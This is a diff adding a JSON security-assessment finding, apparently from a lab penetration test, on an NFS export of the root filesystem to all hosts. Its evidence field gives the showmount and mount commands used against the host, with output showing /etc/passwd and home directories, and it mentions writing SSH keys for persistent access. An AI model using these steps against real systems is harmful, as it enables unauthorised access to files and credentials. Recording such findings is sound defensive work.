@@ -1,0 +1,27 @@
+{
+  "finding_id": "finding_003",
+  "title": "NFS Root Filesystem Export to All Hosts",
+  "severity": "critical",
+  "description": "The NFS service exports the entire root filesystem (/) to all hosts (*) with no access restrictions. Any host on the network can mount the full filesystem, read sensitive configuration files, and potentially write SSH keys for persistent access.",
+  "affected_hosts": [
+    "192.168.0.140"
+  ],
+  "evidence": "Enumeration:\\n$ showmount -e 192.168.0.140\\nExport list for 192.168.0.140:\\n/ *\\n\\nExploitation:\\n$ sudo mount -t nfs -o nolock,vers=3 192.168.0.140:/ /tmp/nfs_mount\\n$ head -10 /tmp/nfs_mount/etc/passwd\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\\nbin:x:2:2:bin:/bin:/bin/sh\\n...\\n\\n$ ls /tmp/nfs_mount/home/\\nftp msfadmin service user\\n\\nFull filesystem browseable including /etc/passwd, home directories, application configs.",
+  "cvss_score": 9.8,
+  "remediation": "Restrict NFS exports to specific trusted hosts/subnets. Never export the root filesystem. Use NFSv4 with Kerberos authentication. Apply the principle of least privilege to exported paths.",
+  "references": [
+    "CWE-732",
+    "CVE-1999-0170"
+  ],
+  "exploitable": true,
+  "exploitation_status": "CONFIRMED",
+  "discovered_at": "2026-03-01T18:20:53.507559",
+  "assessment_id": "test5",
+  "evidence_validation": {
+    "quality": "acceptable",
+    "score": 25,
+    "issues": [],
+    "suggestions": [],
+    "has_exploitation_proof": true
+  }
+}
